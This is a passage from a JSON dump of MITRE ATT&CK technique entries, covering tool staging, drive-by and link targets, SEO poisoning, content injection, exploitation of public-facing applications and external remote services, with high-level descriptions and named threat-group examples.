Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.", "id": "T1608.002", "examples": [{"id": "C0010", "name": "C0010", "description": "For C0010, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system."}, {"id": "C0022", "name": "Operation Dream Job", "description": "For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has staged tools, including gsecdump and WCE, on previously compromised websites."}]}, {"name": "Install Digital Certificate", "description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.", "detailed_description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.\nAdversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers.\nAdversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).", "id": "T1608.003", "examples": []}, {"name": "Drive-by Target", "description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).", "detailed_description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).\nAdversaries may upload or inject malicious web content, such as JavaScript, into websites. This may be done in a number of ways, including:\nIn addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.\nWebsites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.", "id": "T1608.004", "examples": [{"id": "G0050", "name": "APT32", "description": "APT32 has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update."}, {"id": "C0010", "name": "C0010", "description": "For C0010, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM used strategic website compromise to fingerprint then target victims."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised websites to redirect traffic and to host exploit kits."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has redirected compromised machines to an actor-controlled webpage through HTML injection."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has injected malicious JavaScript into compromised websites to infect victims via drive-by download."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools."}]}, {"name": "Link Target", "description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link.", "detailed_description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link.\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.", "id": "T1608.005", "examples": [{"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has created a link to a Dropbox file that has been used in their spear-phishing operations."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. Silent Librarian has also made use of a variety of URL shorteners for these staged websites."}]}, {"name": "SEO Poisoning", "description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.", "detailed_description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).\nIn addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards Supply Chain Compromise lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity which may be targeted and gamed by malicious actors.\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.", "id": "T1608.006", "examples": [{"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has poisoned search engine results to return fake software updates in order to distribute malware."}]}]}]}, {"name": "Initial Access", "description": "The adversary is trying to get into your network.Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spearphishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.", "id": "TA0001", "techniques": [{"name": "Content Injection", "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.", "detailed_description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.\nAdversaries may inject content to victim systems in various ways, including:\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"", "id": "T1659", "examples": [{"id": "S1088", "name": "Disco", "description": "Disco has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware."}], "sub_techniques": []}, {"name": "Drive-by Compromise", "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.", "detailed_description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\nTypical drive-by compromise process:\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.", "id": "T1189", "examples": [{"id": "G0138", "name": "Andariel", "description": "Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range."}, {"id": "G0073", "name": "APT19", "description": "APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets."}, {"id": "G0007", "name": "APT28", "description": "APT28 has compromised targets via strategic web compromise utilizing custom exploit kits. APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages."}, {"id": "G0050", "name": "APT32", "description": "APT32 has infected victims by tricking them into visiting compromised watering hole websites."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly."}, {"id": "G0082", "name": "APT38", "description": "APT38 has conducted watering holes schemes to gain initial access to victims."}, {"id": "G0001", "name": "Axiom", "description": "Axiom has used watering hole attacks to gain access."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a .js file."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore has been spread through malicious advertisements on websites."}, {"id": "C0010", "name": "C0010", "description": "During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has used strategic website compromise to infect victims with malware such as IMAPLoader."}, {"id": "G1034", "name": "Daggerfly", "description": "Daggerfly has used strategic website compromise for initial access against victims."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal leveraged a watering hole to serve up malicious code."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has performed watering hole attacks."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has cloned legitimate websites/applications to distribute the malware."}, {"id": "S0215", "name": "KARAE", "description": "KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer has infected victims using watering holes."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has infected victims using watering holes."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS."}, {"id": "G0095", "name": "Machete", "description": "Machete has distributed Machete through a fake blog website."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has conducted watering-hole attacks through media and magazine websites."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used watering holes to deliver files with exploits to initial victims."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM has been delivered through compromised sites acting as watering holes."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers."}, {"id": "S0496", "name": "REvil", "description": "REvil has infected victim machines through compromised websites and exploit kits."}, {"id": "G0048", "name": "RTM", "description": "RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct."}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has been delivered to targets via downloads from malicious domains."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish has been distributed through compromised websites with malicious content often masquerading as browser updates."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has extensively used strategic web compromises to target victims."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools."}, {"id": "G0010", "name": "Turla", "description": "Turla has infected victims using watering holes."}, {"id": "G0124", "name": "Windigo", "description": "Windigo has distributed Windows malware via drive-by downloads."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has used compromised websites to register custom URL schemes on a remote system."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software."}], "sub_techniques": []}, {"name": "Exploit Public-Facing Application", "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.", "detailed_description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion or Exploitation for Client Execution.\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the Cloud Instance Metadata API), exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.", "id": "T1190", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius exploits public-facing applications for initial access to victim environments. Examples include widespread attempts to exploit CVE-2018-13379 in FortiOS devices and SQL injection activity."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used a variety of public exploits, including CVE 2020-0688 and CVE 2020-17144, to gain execution on vulnerable Microsoft Exchange; they have also conducted SQL injection attacks against external websites."}, {"id": "G0016", "name": "APT29", "description": "APT29 has exploited CVE-2019-19781 for Citrix, CVE-2019-11510 for Pulse Secure VPNs, CVE-2018-13379 for FortiGate VPNs, and CVE-2019-9670 in Zimbra software to gain access."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used SQL injection for initial compromise."}, {"id": "G0096", "name": "APT41", "description": "APT41 exploited CVE-2020-10189 against Zoho ManageEngine Desktop Central through unsafe deserialization, and CVE-2019-19781 to compromise Citrix Application Delivery Controllers (ADC) and gateway devices. APT41 leveraged vulnerabilities such as ProxyLogon exploitation or SQL injection for initial access. APT41 exploited CVE-2021-26855 against a vulnerable Microsoft Exchange Server to gain initial access to the victim network."}, {"id": "G1023", "name": "APT5", "description": "APT5 has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers. "}, {"id": "G0001", "name": "Axiom", "description": "Axiom has been observed using SQL injection to gain access to systems."}, {"id": "G0135", "name": "BackdoorDiplomacy", "description": "BackdoorDiplomacy has exploited CVE-2020-5902, an F5 BIP-IP vulnerability, to drop a Linux backdoor. BackdoorDiplomacy has also exploited mis-configured Plesk servers."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has exploited a buffer overflow vulnerability in Microsoft Internet Information Services (IIS) 6.0, CVE-2017-7269, in order to establish a new HTTP or command and control (C2) server."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has gained initial access by exploiting CVE-2019-18935, a vulnerability within Telerik UI for ASP.NET AJAX."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 exploited CVE-2021-44207 in the USAHerds application and CVE-2021-44228 in Log4j, as well as other .NET deserialization, SQL injection, and directory traversal vulnerabilities to gain initial access."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors exploited VMWare Horizon Unified Access Gateways that were vulnerable to several Log4Shell vulnerabilities, including CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, and CVE-2021-44832."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider exploited CVE-2021-35464 in the ForgeRock Open Access Management (OpenAM) application server to gain initial access."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has exploited multiple unpatched vulnerabilities for initial access including vulnerabilities in Microsoft Exchange, Manage Engine AdSelfService Plus, Confluence, and Log4j."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER is installed following exploitation of a vulnerable FortiGate device. "}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors exploited CVE-2023-46805 and CVE-2024-21887 in Ivanti Connect Secure VPN appliances to enable authentication bypass and command injection. A server-side request forgery (SSRF) vulnerability, CVE-2024-21893, was identified later and used to bypass mitigations for the initial two vulnerabilities by chaining with CVE-2024-21887."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 and CVE-2020-0688 for Citrix and MS Exchange, and CVE-2018-13379 for Fortinet VPNs."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has compromised victims by directly exploiting vulnerabilities of public-facing servers, including those associated with Microsoft Exchange and Oracle GlassFish."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear gains initial access to victim environments by exploiting external-facing services. Examples include exploitation of CVE-2021-26084 in Confluence servers; CVE-2022-41040, ProxyShell, and other vulnerabilities in Microsoft Exchange; and multiple vulnerabilities in open-source platforms such as content management systems."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has exploited known vulnerabilities such as CVE-2017-1000486 (Primefaces Application Expression Language Injection), CVE-2015-7450 (WebSphere Application Server SOAP Deserialization Exploit), CVE-2010-5326 (SAP NewWeaver Invoker Servlet Exploit), and EDB-ID-24963 (SAP NetWeaver ConfigServlet Remote Code Execution) to gain initial access."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has exploited known vulnerabilities in Fortinet, PulseSecure, and Palo Alto VPN appliances."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM exploited a publicly-facing servers including Wildfly/JBoss servers to gain access to the network."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has exploited Oracle WebLogic vulnerabilities for initial compromise."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has exploited CVE-2021-44228 in Log4j and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065  to compromise on-premises versions of Microsoft Exchange Server."}, {"id": "S0224", "name": "Havij", "description": "Havij is used to automate SQL injection."}, {"id": "C0038", "name": "HomeLand Justice", "description": "For HomeLand Justice, threat actors exploited CVE-2019-0604 in Microsoft SharePoint for initial access."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has exploited known vulnerabilities including CVE-2023-3519 in Citrix NetScaler for initial access."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has compromised networks by exploiting Internet-facing applications, including vulnerable Microsoft Exchange and SharePoint servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has exploited various vulnerabilities for initial access, including Microsoft Exchange vulnerability CVE-2020-0688."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via \"ProxyShell\" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379)."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has leveraged vulnerabilities in Pulse Secure VPNs to hijack sessions."}, {"id": "G1009", "name": "Moses Staff", "description": "Moses Staff has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has exploited the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688)."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used SQL injection exploits against extranet web servers to gain access."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors exploited multiple vulnerabilities in externally facing servers."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors gained initial access by exploiting vulnerabilities in JBoss webservers."}, {"id": "G1040", "name": "Play", "description": "Play has exploited known vulnerabilities for initial access including CVE-2018-13379 and CVE-2020-12812 in FortiOS and CVE-2022-41082 and CVE-2022-41040 (\"ProxyNotShell\") in Microsoft Exchange."}, {"id": "G0106", "name": "Rocke", "description": "Rocke exploited Apache Struts, Oracle WebLogic (CVE-2017-10271), and Adobe ColdFusion (CVE-2017-3066) vulnerabilities to deliver malware."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems."}, {"id": "S0623", "name": "Siloscape", "description": "Siloscape is executed after the attacker gains initial access to a Windows container using a known vulnerability."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 exploited CVE-2020-0688 against the Microsoft Exchange Control Panel to regain access to a network."}, {"id": "S0516", "name": "SoreFang", "description": "SoreFang can gain access by exploiting a Sangfor SSL VPN vulnerability that allows for the placement and delivery of malicious update binaries."}, {"id": "S0225", "name": "sqlmap", "description": "sqlmap can be used to automate exploitation of SQL injection vulnerabilities."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has exploited the Microsoft SharePoint vulnerability CVE-2019-0604 and CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in Exchange Server."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has exploited the ProxyLogon vulnerability (CVE-2021-26855) to compromise Exchange Servers at multiple organizations."}, {"id": "C0039", "name": "Versa Director Zero Day Exploitation", "description": "Versa Director Zero Day Exploitation involved exploitation of a vulnerability in Versa Director servers, since identified as CVE-2024-39717, for initial access and code execution."}, {"id": "G0123", "name": "Volatile Cedar", "description": "Volatile Cedar has targeted publicly facing web servers, with both automatic and manual vulnerability discovery. "}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has gained initial access through exploitation of multiple vulnerabilities in internet-facing software and appliances such as Fortinet, Ivanti (formerly Pulse Secure), NETGEAR, Citrix, and Cisco."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern has exploited known and zero-day vulnerabilities in software usch as Roundcube Webmail servers and the \"Follina\" vulnerability."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has been dropped through exploitation of CVE-2011-2462, CVE-2013-3163, and CVE-2014-0322."}], "sub_techniques": []}, {"name": "External Remote Services", "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.", "detailed_description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.", "id": "T1133", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. "}, {"id": "G1024", "name": "Akira", "description": "Akira uses compromised VPN accounts for initial access to victim networks."}, {"id": "G0026", "name": "APT18", "description": "APT18 actors leverage legitimate credentials to log into external remote services."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used Tor and a variety of commercial VPN services to route brute force authentication attempts."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used compromised identities to access networks via VPNs and Citrix."}, {"id": "G0096", "name": "APT41", "description": "APT41 compromised an online billing/payment service using VPN access between a third-party service provider and the targeted payment service."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used Citrix and VPNs to persist in compromised environments."}, {"id": "C0032", "name": "C0032", "description": "During the C0032 campaign, TEMP.Veles used VPN access to persist in the victim environment."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services."}, {"id": "C0004", "name": "CostaRicto", "description": "During CostaRicto, the threat actors set up remote tunneling using an SSH tool to maintain access to a compromised environment."}, {"id": "S0600", "name": "Doki", "description": "Doki was executed through an open Docker daemon API port."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has used VPNs and Outlook Web Access (OWA) to maintain access to victim networks."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear have used VPNs both for initial access to victim environments and for persistence within them following compromise."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has gained access to compromised environments via remote access services such as the corporate virtual private network (VPN)."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM has used VPN services, including SoftEther VPN, to access and maintain persistence in victim environments."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has used publicly-accessible RDP and remote management and monitoring (RMM) servers to gain access to victim machines."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard was executed through an unsecure kubelet that allowed anonymous access to the victim environment."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has gained access through VPNs including with compromised accounts and stolen VPN certificates."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used RDP to establish persistence."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing was executed in an Ubuntu container deployed via an open Docker daemon API."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has gained access to internet-facing systems and applications, including virtual private network (VPN), remote desktop protocol (RDP), and virtual desktop infrastructure (VDI) including Citrix. 